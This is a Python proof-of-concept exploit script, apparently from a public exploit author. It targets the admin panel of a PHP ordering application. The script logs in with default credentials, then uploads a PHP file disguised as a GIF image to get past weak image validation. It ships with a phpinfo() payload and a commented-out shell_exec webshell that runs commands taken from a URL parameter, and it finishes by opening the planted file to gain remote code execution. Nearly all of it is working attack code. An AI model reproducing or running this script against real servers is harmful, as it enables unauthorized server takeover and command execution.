#!/usr/bin/python
# Author @nu11secur1ty

from selenium import webdriver
import requests, sys, time
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

SERVER_URL = str(input("Type your App URL location...\n")) 
# Login app
LOGIN_URL = SERVER_URL + '/admin/login.php'

# Setting up the id of the fake picture
# Setting up the vulnerability path
UPLOAD_URL = SERVER_URL + "/admin/products/controller.php?action=photos&id=201735"

# Vulnerable directory traversal
PWN_URL = SERVER_URL + "/admin/products/uploaded_photos/"

# Seting up the credentials 
USERNAME = "janobe"
PASSWORD = "admin"
WEBSHELL_NAME = "pic.php"

# Create a web session 
sess = requests.Session()

# GET request to the webserver - Start a session and retrieve a session cookie
get_session = sess.get(LOGIN_URL, verify=False)

# Check connection to website & print session cookie to terminal OR die
if get_session.status_code == 200:
    print(Fore.GREEN +"Successfully connected to the application and created a session.")
    print(Style.RESET_ALL)
    #print(Fore.YELLOW +"Session Cookie:" + get_session.headers['Set-Cookie'])
    #print(Style.RESET_ALL)

else:
    print("Cannot connect to the server and create a web session.")
    sys.exit(-1)

# 1. Login to get Admin access
login_data = {'username': USERNAME, 'password': PASSWORD, 'login': ''}
print(Fore.YELLOW +"Attempting to log in is successful...")
print(Style.RESET_ALL)

# Login for data access
auth = sess.post(url=LOGIN_URL, data=login_data, verify=False, allow_redirects=True)
if auth.status_code == 200:
    print(Fore.GREEN +"Login Success")
    print(Style.RESET_ALL)
else:
    print("Something Went Wrong")
    
# Upload PHP Webshell PoC or PoC info.
webshell = {
    'photo':
        (
            WEBSHELL_NAME,
            ## Shell
            #'GIF89a <?php echo shell_exec($_GET["cmd"]);?>',
            
            ## PoC info
            'GIF89a <?php phpinfo();?>',
            
            # App structure
            'application/octet-stream',
            {'Content-Disposition': 'form-data'}
        )
}
print(Fore.YELLOW +"Upload Webshell via insecure verification of images (getimagesize()) function\n")
print(Style.RESET_ALL)
time.sleep(7)
print(Fore.BLUE +"For more information: https://www.php.net/manual/en/function.getimagesize.php")
print(Style.RESET_ALL)
time.sleep(7)
print(Fore.RED +"Sending malicious POST Request to the Server...")
print(Style.RESET_ALL)
time.sleep(7)
print(Fore.GREEN + "DONE: The malicious request is sent!")
print(Style.RESET_ALL)

# Uploading the PoC
upload_webshell = sess.post(url=UPLOAD_URL, files=webshell, verify=False)

# Open the vulnerability URL - directory traversal
website_link="http://192.168.1.2/bsenordering/admin/products/uploaded_photos/pic.php"
browser = webdriver.Chrome()
browser.get((website_link))

print(Fore.RED +"Press any key to stop the PWNED RCE session and exitintg from the exploit...\n")
print(Style.RESET_ALL)
input()

if "window.location='index.php'" in upload_webshell.text:
    print(Fore.GREEN +"Success")
    print(Fore.GREEN +"Your PoC is deployed, goodbye =)")
    print(Style.RESET_ALL)
    
    ## GET parameter execution
    # uncomment for "shell" print(Fore.BLUE +"Execute command on your browser for webshell session " + PWN_URL + WEBSHELL_NAME + "?cmd=whoami")
    #print(Fore.BLUE +"Execute command on your browser to GET information about the server " + PWN_URL + WEBSHELL_NAME)
    #print(Style.RESET_ALL)
      
else:
    print(Fore.RED +"Something Went Wrong")
    print(Style.RESET_ALL)
